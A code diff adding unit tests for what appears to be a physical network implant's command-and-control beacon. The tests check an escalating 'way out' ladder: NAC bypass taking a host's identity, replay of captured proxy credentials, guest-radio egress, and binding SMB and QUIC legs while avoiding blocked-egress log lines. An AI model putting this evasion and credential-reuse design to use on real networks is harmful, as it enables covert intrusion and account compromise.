@@ -713,6 +713,79 @@ class TestTheRadioVerb(RadioCase):
                          "the environment's proxies are the host "
                          "network's too")
 
+    def test_rung_four_rolls_the_radio_back_before_taking_the_identity(self):
+        # Rung 3 crosses at hour 5 and rung 4 at hour 7, and the window
+        # closes only when a leg **delivers** -- so "the radio associated
+        # and still cannot reach the server" is the state the ladder is
+        # designed to pass through, and the commonest outcome of a
+        # corporate guest SSID. Rung 4's whole effect is on the tapped
+        # port: `nac_bypass` rewrites what leaves `eth0` and `br0` under
+        # the host's MAC. With the lease still bound, every socket is
+        # pinned to the radio's address and `ip rule from <lease>` sends
+        # it out `wlan0` -- the identity taken, the one-shot spent, and
+        # not one byte using it. The irreversible rung wins.
+        beacon = self.beacon(tap=self.open_ssid(),
+                             borrow={"credentials": [A_CREDENTIAL]})
+        self.onboard(beacon)
+        ran = self.radio(beacon)
+        beacon._exec_egress("credential")
+        proxies = dict(beacon._proxy_session.proxies)
+        beacon._exec_egress("radio")
+        self.assertEqual(beacon._way_out_source, "192.168.9.42")
+        del ran[:]
+
+        answer = beacon._exec_egress("identity")
+
+        self.assertNotIn("[error]", answer)
+        self.assertIn("rolled back", answer)
+        self.assertEqual(beacon._way_out_source, "",
+                         "the identity was taken with every socket still "
+                         "pinned to the radio's lease")
+        self.assertIsNone(beacon._proxy_session.source_address)
+        # And the tapped path the implant is going back to.
+        self.assertEqual(beacon._proxy_session.proxies, proxies)
+        joined = [" ".join(command) for command in ran]
+        self.assertIn("ip route flush table 100", joined)
+        self.assertIn("ip rule del from 192.168.9.42 table 100", joined)
+
+    def test_rung_four_with_no_radio_says_nothing_about_a_rollback(self):
+        beacon = self.beacon(tap=self.open_ssid())
+        answer = beacon._exec_egress("identity")
+        self.assertNotIn("[error]", answer)
+        self.assertNotIn("rolled back", answer)
+
+    def test_a_delivering_leg_drops_the_stashed_credential(self):
+        # The bind survives a delivering leg on purpose, so the stash did
+        # too -- and it holds a third party's `Proxy-Authorization`. A
+        # rollback in a later outage would have put a weeks-old Basic
+        # token back on the session and replayed it against the host's
+        # proxy, which is how "an account that locks out" happens. The
+        # two guards against a capture crossing outages are both about
+        # the *file*, not about this copy in memory.
+        beacon = self.beacon(tap=self.open_ssid(),
+                             borrow={"credentials": [A_CREDENTIAL]})
+        self.onboard(beacon)
+        self.radio(beacon)
+        beacon._exec_egress("credential")
+        proxies = dict(beacon._proxy_session.proxies)
+        self.assertTrue(proxies, "there was no borrowed proxy to keep")
+        beacon._exec_egress("radio")
+        self.assertIsNotNone(beacon._way_out_tapped_path)
+
+        beacon._leg_recovered()
+
+        self.assertEqual(beacon._way_out_source, "192.168.9.42",
+                         "the bind is still meant to survive this")
+        beacon._radio_rollback("wlan0", "192.168.9.42", "a later outage")
+        # The credential is gone and the path is not. Dropping the whole
+        # stash left the implant back on the tapped port with no proxy
+        # and `trust_env` off -- `c2.proxy.mode: none` applied with
+        # nobody asking, and on an NTLM build the relay's own loopback
+        # URL gone with it.
+        self.assertEqual(beacon._proxy_session.headers, {})
+        self.assertEqual(beacon._proxy_session.proxies, proxies)
+        self.assertTrue(beacon._proxy_session.trust_env)
+
     def test_a_rollback_puts_the_tapped_paths_proxy_back(self):
         # The rung leaves the implant as it found it: back on the tapped
         # port, the borrowed proxy was the right one, and an implant that
@@ -733,6 +806,90 @@ class TestTheRadioVerb(RadioCase):
         self.assertEqual(beacon._proxy_session.headers, headers)
         self.assertIsNone(beacon._proxy_session.source_address)
 
+    def test_every_tapped_network_verb_refuses_while_the_lease_holds(self):
+        # Round six closed `credential` and `portal` inside
+        # `_egress_borrow`; `proxy` and `rediscover` reached around it,
+        # which is the same defect through the third door. `egress proxy`
+        # put the host's RFC1918 proxy back on the radio-bound session
+        # *and* turned `trust_env` back on, undoing both halves of what
+        # the bind had done -- and the shipped example policy's second
+        # rule is `when: {flags: [proxy_found]} / try: proxy`.
+        beacon = self.beacon(tap=self.open_ssid(),
+                             borrow={"credentials": [A_CREDENTIAL],
+                                     "portal": A_PORTAL})
+        self.onboard(beacon)
+        self.radio(beacon)
+        beacon._proxy.proxies.append({"url": "http://10.0.0.1:3128",
+                                      "source": "env:http_proxy"})
+        beacon._exec_egress("radio")
+
+        for task in ("credential", "portal", "rediscover",
+                     "proxy http://10.0.0.1:3128", "proxy 1"):
+            with self.subTest(task=task):
+                answer = beacon._exec_egress(task)
+                self.assertIn("[error]", answer)
+                self.assertIn("own radio", answer)
+                self.assertEqual(beacon._proxy_session.proxies, {})
+                self.assertEqual(beacon._proxy_session.headers, {})
+                self.assertFalse(beacon._proxy_session.trust_env)
+                self.assertEqual(beacon._proxy_session.source_address,
+                                 ("192.168.9.42", 0))
+
+    def test_the_gate_skips_them_so_no_budget_is_spent(self):
+        # Refused by the arithmetic's own gate and not only inside each
+        # verb, so the candidate walk moves on: a refusal the situation
+        # guarantees must not cost an attempt the quieter rules below it
+        # do not get.
+        beacon = self.beacon(tap=self.open_ssid())
+        self.onboard(beacon)
+        self.radio(beacon)
+        beacon._exec_egress("radio")
+
+        for verb in ("proxy", "rediscover", "credential", "portal"):
+            with self.subTest(verb=verb):
+                allowed, numbers = beacon._way_out_allows(verb)
+                self.assertFalse(allowed)
+                self.assertEqual(numbers["blocked_by"],
+                                 "the radio rung's lease")
+        # And the carrier is deliberately not among them.
+        self.assertTrue(beacon._way_out_allows("gsocket")[0])
+
+    def test_the_borrow_verbs_refuse_while_the_radio_holds_a_lease(self):
+        # Round five stopped the bind from *carrying* a borrowed proxy
+        # onto the radio. This is the same defect from the other side:
+        # nothing stopped a `credential` rule from putting one there
+        # afterwards, and that is the ordinary climb -- rung 2 crosses at
+        # hour 1, the window closes only when a leg **delivers**, so a
+        # radio that associates and still cannot reach the team server
+        # leaves the candidate walk running every cycle with rung 2 at
+        # the top of it. The captured credential would then be offered to
+        # whatever answers at an RFC1918 address on the guest network.
+        beacon = self.beacon(tap=self.open_ssid(),
+                             borrow={"credentials": [A_CREDENTIAL],
+                                     "portal": A_PORTAL})
+        self.onboard(beacon)
+        self.radio(beacon)
+        beacon._exec_egress("radio")
+
+        for task in ("credential", "portal"):
+            with self.subTest(task=task):
+                answer = beacon._exec_egress(task)
+                self.assertIn("[error]", answer)
+                self.assertIn("own radio", answer)
+                self.assertIn("192.168.9.42", answer)
+        self.assertEqual(beacon._proxy_session.proxies, {})
+        self.assertEqual(beacon._proxy_session.headers, {})
+
+    def test_they_work_again_once_the_rung_is_rolled_back(self):
+        beacon = self.beacon(tap=self.open_ssid(),
+                             borrow={"credentials": [A_CREDENTIAL]})
+        self.onboard(beacon)
+        self.radio(beacon)
+        beacon._exec_egress("radio")
+        beacon._radio_rollback("wlan0", "192.168.9.42", "a test")
+
+        self.assertNotIn("[error]", beacon._exec_egress("credential"))
+
     def test_a_second_radio_attempt_does_not_lose_the_stash(self):
         # Repeating the rung is the ordinary case -- no verb tests its own
         # result -- so the second attempt must not re-stash the empty
@@ -747,6 +904,13 @@ class TestTheRadioVerb(RadioCase):
 
         beacon._exec_egress("radio")
         beacon._exec_egress("radio")
+        # And the second bind leaves the radio's own session as bare as
+        # the first did: nothing of the tapped path, and the
+        # environment's proxies still off.
+        self.assertEqual(beacon._proxy_session.proxies, {})
+        self.assertEqual(beacon._proxy_session.headers, {})
+        self.assertFalse(beacon._proxy_session.trust_env)
+
         beacon._radio_rollback("wlan0", "192.168.9.42", "a test")
 
         self.assertEqual(beacon._proxy_session.proxies, proxies)
@@ -873,10 +1037,11 @@ class TestTheDirectRetryWhenAProxyIsStale(RungCase):
     stopped answering.
     """
 
-    def a_beacon_posting_through(self, proxies):
+    def a_beacon_posting_through(self, proxies, leased="192.168.9.42"):
         """A beacon whose every POST is refused, and what each one used."""
         beacon = self.beacon()
         beacon._registered = True
+        beacon._way_out_source = leased
         # `_init_proxy` runs in `start()`, which these tests do not call.
         beacon._proxy_session = beacon._bound_session()
         beacon._proxy_session.proxies = dict(proxies)
@@ -909,6 +1074,19 @@ class TestTheDirectRetryWhenAProxyIsStale(RungCase):
         # twice, which is a second round trip on a monitored network for
         # no new chance of delivery.
         beacon, tried = self.a_beacon_posting_through({})
+
+        beacon._https_post("beacon", {"a": 1})
+
+        self.assertEqual(len(tried), 1)
+
+    def test_a_build_with_no_lease_is_not_retried_either(self):
+        # The gate that keeps this out of every proxied build that never
+        # enabled the way out: ungated, a proxy timeout on an ordinary
+        # cycle produced a direct 443 to the team server on a proxy-only
+        # network -- a blocked-egress log line to a known destination,
+        # once per beacon interval, for ever.
+        beacon, tried = self.a_beacon_posting_through(
+            {"https": "http://10.0.0.1:3128"}, leased="")
 
         beacon._https_post("beacon", {"a": 1})
 
@@ -1198,6 +1376,104 @@ class TestTheBindIsASocketFactAndNotAField(unittest.TestCase):
         self.assertEqual(self.observed(seen), [("127.0.0.1", port)])
 
 
+    def listening(self, kind):
+        """A TCP or UDP socket on loopback, and the peers it saw."""
+        seen = []
+        if kind == "tcp":
+            server = socket.socket()
+            server.bind(("127.0.0.1", 0))
+            server.listen(2)
+        else:
+            server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            server.bind(("127.0.0.1", 0))
+        server.settimeout(0.2)
+        done = threading.Event()
+
+        def serve():
+            while not done.is_set():
+                try:
+                    if kind == "tcp":
+                        connection, peer = server.accept()
+                        connection.close()
+                    else:
+                        _data, peer = server.recvfrom(4096)
+                except socket.timeout:
+                    continue
+                except OSError:
+                    return
+                seen.append(peer)
+
+        thread = threading.Thread(target=serve, daemon=True)
+        thread.start()
+
+        def stop():
+            done.set()
+            thread.join(timeout=5)
+            server.close()
+
+        self.addCleanup(stop)
+        return seen, "%s:%d" % server.getsockname()
+
+    def a_leg_beacon(self, **legs):
+        import base64
+
+        from software.c2.beacon import Beacon, read_way_out_policy
+        block = {
+            "beacon_interval_seconds": 300, "jitter_percent": 0,
+            "encryption_key": base64.b64encode(b"\x24" * 32).decode(),
+            "proxy": {"mode": "auto"}, "https": {"enabled": False},
+            "dns": {"enabled": False}, "smb": {"enabled": False},
+            "quic": {"enabled": False},
+            "way_out": read_way_out_policy(None),
+        }
+        block.update(legs)
+        beacon = Beacon({"c2": block})
+        beacon._running = False
+        self.addCleanup(setattr, beacon, "_running", False)
+        return beacon
+
+    def test_the_smb_and_quic_legs_leave_by_it_too(self):
+        # `_bound_session` owns the invariant for everything through
+        # `_HttpSession`, and `_dns_query` takes a source -- but these two
+        # build raw sockets, and they took no bind at all. Two of the four
+        # names in `_RESCUE_UPSTREAM`, both advertised in the README and
+        # both configured beside gsocket in the shipped yaml: on a build
+        # whose primary leg is either of them, rung 3 answered "this
+        # implant's own traffic only" and changed nothing about where that
+        # leg's packets went. "Every socket this implant opens" was a
+        # claim about one class read as a claim about the device.
+        #
+        # Measured from outside the process: the lease is an address this
+        # host does not have, so a socket that really binds it cannot
+        # reach a listener on loopback at all -- and a socket that ignores
+        # the bind arrives. The listener is the witness, and the
+        # unbound run is there so a leg that simply never fires cannot
+        # pass this.
+        for kind, leg, drive in (
+                ("tcp", "smb", lambda beacon: beacon._smb_connect()),
+                ("udp", "quic", lambda beacon: beacon._quic_send({"a": 1}))):
+            with self.subTest(leg=leg):
+                seen, where = self.listening(kind)
+                loose = self.a_leg_beacon(**{leg: {"enabled": True,
+                                                   "server": where,
+                                                   "pipe": "spoolss"}})
+                drive(loose)
+                self.assertTrue(self.observed(seen),
+                                "the %s leg did not reach the listener even "
+                                "unbound, so this test proves nothing" % leg)
+
+                bound = self.a_leg_beacon(**{leg: {"enabled": True,
+                                                   "server": where,
+                                                   "pipe": "spoolss"}})
+                bound._way_out_source = "192.0.2.1"
+                del seen[:]
+                drive(bound)
+                time.sleep(0.3)
+                self.assertEqual(seen, [],
+                                 "the %s leg left by the kernel's own "
+                                 "address while the radio rung held a "
+                                 "lease" % leg)
+
     def test_the_ntlm_relays_upstream_hop_leaves_by_it_too(self):
         # On a `proxy.ntlm.enabled` build this is the hop that actually
         # leaves the device: the session the rung binds connects to
@@ -1244,6 +1520,64 @@ class TestTheBindIsASocketFactAndNotAField(unittest.TestCase):
 
         port = self.bound_to(attempt)
         self.assertEqual(self.observed(seen), [("127.0.0.1", port)])
+
+    def test_a_relay_on_this_host_is_still_the_sessions_proxy(self):
+        # The reason to stash the tapped path's proxy is that a proxy on
+        # the *host's network* is not reachable from the radio's --
+        # and `127.0.0.1` is reachable from every path. On a
+        # `proxy.ntlm.enabled` build the session's proxy *is* the local
+        # relay's listener, so stashing it meant nothing went through the
+        # relay after rung 3: the hop this rung carefully binds had
+        # nothing to carry, and two docstrings described a configuration
+        # the bind had just destroyed.
+        import base64
+
+        from software.c2.beacon import Beacon, read_way_out_policy
+        beacon = Beacon({"c2": {
+            "beacon_interval_seconds": 300, "jitter_percent": 0,
+            "encryption_key": base64.b64encode(b"\x24" * 32).decode(),
+            "proxy": {"mode": "auto"}, "https": {"enabled": False},
+            "dns": {"enabled": False}, "smb": {"enabled": False},
+            "quic": {"enabled": False},
+            "way_out": read_way_out_policy(None),
+        }})
+        beacon._running = False
+        self.addCleanup(setattr, beacon, "_running", False)
+        beacon._proxy_session = beacon._bound_session()
+        beacon._proxy_session.proxies = {
+            "http": "http://127.0.0.1:65291",
+            "https": "http://127.0.0.1:65291"}
+
+        beacon._way_out_bind("192.168.9.42")
+
+        self.assertEqual(beacon._proxy_session.proxies,
+                         {"http": "http://127.0.0.1:65291",
+                          "https": "http://127.0.0.1:65291"})
+        self.assertEqual(beacon._proxy_session.source_address,
+                         ("192.168.9.42", 0))
+
+    def test_a_proxy_on_the_hosts_network_is_still_stashed(self):
+        import base64
+
+        from software.c2.beacon import Beacon, read_way_out_policy
+        beacon = Beacon({"c2": {
+            "beacon_interval_seconds": 300, "jitter_percent": 0,
+            "encryption_key": base64.b64encode(b"\x24" * 32).decode(),
+            "proxy": {"mode": "auto"}, "https": {"enabled": False},
+            "dns": {"enabled": False}, "smb": {"enabled": False},
+            "quic": {"enabled": False},
+            "way_out": read_way_out_policy(None),
+        }})
+        beacon._running = False
+        self.addCleanup(setattr, beacon, "_running", False)
+        beacon._proxy_session = beacon._bound_session()
+        beacon._proxy_session.proxies = {"http": "http://10.0.0.1:3128"}
+
+        beacon._way_out_bind("192.168.9.42")
+
+        self.assertEqual(beacon._proxy_session.proxies, {})
+        self.assertEqual(beacon._way_out_tapped_path[0],
+                         {"http": "http://10.0.0.1:3128"})
 
     def test_the_rung_hands_its_lease_to_a_relay_that_is_already_serving(self):
         # The relay is started by `_init_proxy`, long before any rung
